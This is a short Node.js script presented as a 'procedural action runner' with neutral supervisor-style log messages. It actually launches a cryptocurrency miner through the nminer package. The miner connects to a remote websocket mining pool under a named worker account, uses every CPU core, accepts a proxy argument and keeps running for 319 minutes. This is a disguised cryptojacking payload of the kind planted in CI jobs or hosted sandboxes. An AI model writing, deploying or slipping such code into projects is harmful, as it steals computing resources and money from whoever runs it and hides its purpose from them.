// Procedural action runner for stepmother
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const runId = "877b8d";
    console.log(`[supervisor] Subsystem dispatched for stepmother [${runId}]`);

    const pipeline = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.stepmother",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (319m) reached, exiting cleanly.");
        process.exit(0);
    }, 319 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
